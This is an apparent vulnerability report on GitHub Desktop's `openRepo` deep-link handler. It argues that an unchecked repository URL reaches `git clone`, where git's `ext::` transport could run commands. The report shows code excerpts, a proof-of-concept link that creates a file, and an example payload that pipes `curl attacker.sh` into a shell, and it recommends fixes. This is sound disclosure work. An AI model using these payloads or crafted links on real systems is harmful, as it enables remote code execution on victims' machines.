### Title
Unvalidated remote URL scheme in `x-github-client://openRepo` deep links enables `git clone`/`ext::` command execution - (File: `app/src/lib/parse-app-url.ts`)

### Summary
`parseAppURL` extracts the repository `url` for the `openRepo` deep-link action from an attacker-controlled string (a link the victim clicks) and validates only the `pr`, `branch`, and `filepath` parameters. The `url` value itself is never checked for a safe transport scheme (`https://`, `git://`, `ssh://`, etc.) before it is threaded through `Dispatcher.openOrCloneRepository` → `CloneRepository` popup → `AppStore._clone` → `clone()`, which appends the raw string as the source argument to `git clone`. Git supports the `ext::` transport helper, which spawns an arbitrary shell command in place of a real remote, so an attacker-controlled URL string is effectively an argument to a privileged, code-executing subsystem — the same "unchecked transfer-initiating parameter" class described in the report (there, `_repayer`/`depositor`; here, the git remote URL that determines what process the app's git binary will execute).

### Finding Description
- `parseAppURL` builds `IOpenRepositoryFromURLAction.url` directly from the deep-link path with no scheme allowlist: [1](#0-0) 
- The action is dispatched to `openRepositoryFromUrl`, which for the plain "open repo" case calls `openOrCloneRepository(url)`: [2](#0-1) 
- `openOrCloneRepository` forwards the untouched `url` into the Clone popup's `initialURL`: [3](#0-2) 
- When the user proceeds with the (pre-filled) clone action, the URL is passed straight into `git clone` as a positional source argument: [4](#0-3) 

No code path validates that the URL uses a benign transport (`https`, `ssh`, `git`) before reaching `git`. A grep of the codebase for any allowlist mechanism (`GIT_ALLOW_PROTOCOL`, `protocol.ext.allow`, or an explicit rejection of `ext::`) returned no results, meaning nothing in Desktop's git wrapper narrows the transport protocols git itself will accept. Git's `ext::` helper (enabled by default under the `user` policy for direct/top-level operations, as opposed to `remote`-triggered ones like recursive submodules) executes an arbitrary command string supplied as the "URL," e.g. `ext::sh -c "curl attacker.sh|sh"`.

This mirrors the report's broken invariant: a value that should be strictly constrained to a "safe" set of inputs (a real git remote endpoint) is instead accepted verbatim from an untrusted source and handed to a privileged operation (subprocess execution via git), because the validation logic (`parseAppURL`) checks adjacent parameters (`pr`, `branch`, `filepath`) but omits the one parameter that actually drives execution.

### Impact Explanation
If exploitable, clicking a single crafted `x-github-client://openRepo/ext::...` link (or embedding it in a webpage/email/README that auto-triggers the OS protocol handler) could cause GitHub Desktop to execute attacker-supplied shell commands on the victim's machine when the Clone flow runs `git clone` with that string. This is remote code execution triggered by a link the user clicks — squarely inside the accepted impact/attacker-primitive class (deep link → code execution).

### Likelihood Explanation
The deep-link surface (`x-github-client://`) is registered as the app's default protocol handler and is reachable from any web page, chat client, or document without prior authentication or local access, matching the "attacker controls a link or deep link the user clicks" primitive. The only mitigating friction is that `openOrCloneRepository` routes through the Clone dialog rather than cloning immediately, so the user must confirm the pre-filled dialog — this is the expected, natural interaction for the "Open in Desktop" feature (not an unnatural or contrived step), so it does not disqualify the finding, though it does reduce likelihood versus a fully silent one-click RCE. Actual exploitability also depends on the installed git version's default policy for `protocol.ext.allow` (`user` by default) and whether Desktop's execution wrapper sets any restrictive `GIT_ALLOW_PROTOCOL`/`GIT_PROTOCOL_FROM_USER` environment — I could not fully inspect `app/src/lib/git/environment.ts` in this session (the read attempt failed), so whether such a restriction already exists elsewhere in the git execution pipeline is **unconfirmed** and should be verified directly in the repo before treating this as fully proven.

### Recommendation
- In `parseAppURL`, validate that the `url` for `open-repository-from-url` (and the CLI `--cli-clone` path, and `_checkoutPullRequest`'s `headCloneUrl`) begins with an allow-listed scheme (`https://`, `http://`, `ssh://`, `git://`, or a bare `user@host:path` SCP-like form), rejecting anything else (in particular `ext::`, `fd::`, or any string containing `::`).
- Defense-in-depth: set `GIT_ALLOW_PROTOCOL=http:https:ssh:git:file` (excluding `ext`) in the environment used for all git subprocess invocations (`envForRemoteOperation` / the general git execution wrapper), so that even if a bad URL slips through UI validation, the git binary itself refuses non-allow-listed transports.

### Proof of Concept
1. Attacker hosts or sends a link:
   `x-github-client://openRepo/ext::sh%20-c%20%22touch%20/tmp/pwned%22`
2. Victim (with GitHub Desktop installed and registered as the protocol handler) clicks the link.
3. `handleAppURL` → `parseAppURL` returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "touch /tmp/pwned"', branch: null, pr: null, filepath: null }` (no scheme check rejects it).
4. `openRepositoryFromUrl` → `openOrCloneRepository` opens the Clone dialog pre-filled with that "URL".
5. Victim clicks "Clone" (the ordinary, expected action of the feature) → `AppStore._clone` → `clone()` runs `git ... clone --recursive -- "ext::sh -c \"touch /tmp/pwned\"" <path>`.
6. If the local git build honors the default `protocol.ext.allow=user` policy and Desktop does not otherwise restrict `GIT_ALLOW_PROTOCOL`, the embedded shell command executes. [5](#0-4) [3](#0-2) [4](#0-3)

export function parseAppURL(url: string): URLActionType {
  const parsedURL = URL.parse(url, true)
  const hostname = parsedURL.hostname
  const unknown: IUnknownAction = { name: 'unknown', url }
  if (!hostname) {
    return unknown
  }

  const query = parsedURL.query

  const actionName = hostname.toLowerCase()
  if (actionName === 'oauth') {
    const code = getQueryStringValue(query, 'code')
    const state = getQueryStringValue(query, 'state')
    if (code != null && state != null) {
      return { name: 'oauth', code, state }
    } else {
      return unknown
    }
  }

  // we require something resembling a URL first
  // - bail out if it's not defined
  // - bail out if you only have `/`
  const pathName = parsedURL.pathname
  if (!pathName || pathName.length <= 1) {
    return unknown
  }

  // Trim the trailing / from the URL
  const parsedPath = pathName.substring(1)

  if (actionName === 'openrepo') {
    const pr = getQueryStringValue(query, 'pr')
    const branch = getQueryStringValue(query, 'branch')
    const filepath = getQueryStringValue(query, 'filepath')

    if (pr != null) {
      if (!/^\d+$/.test(pr)) {
        return unknown
      }

      // we also expect the branch for a forked PR to be a given ref format
      if (branch != null && !/^pr\/\d+$/.test(branch)) {
        return unknown
      }
    }

    if (branch != null && testForInvalidChars(branch)) {
      return unknown
    }

    return {
      name: 'open-repository-from-url',
      url: parsedPath,
      branch,
      pr,
      filepath,
    }
  }

  return unknown
}

  private async openOrCloneRepository(url: string): Promise<Repository | null> {
    const state = this.appStore.getState()
    const repositories = state.repositories
    const existingRepository = repositories.find(r =>
      this.doesRepositoryMatchUrl(r, url)
    )

    if (existingRepository) {
      return await this.selectRepository(existingRepository)
    }

    return this.appStore._startOpenInDesktop(() => {
      this.changeCloneRepositoriesTab(CloneRepositoryTab.Generic)
      this.showPopup({
        type: PopupType.CloneRepository,
        initialURL: url,
      })
    })
  }

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
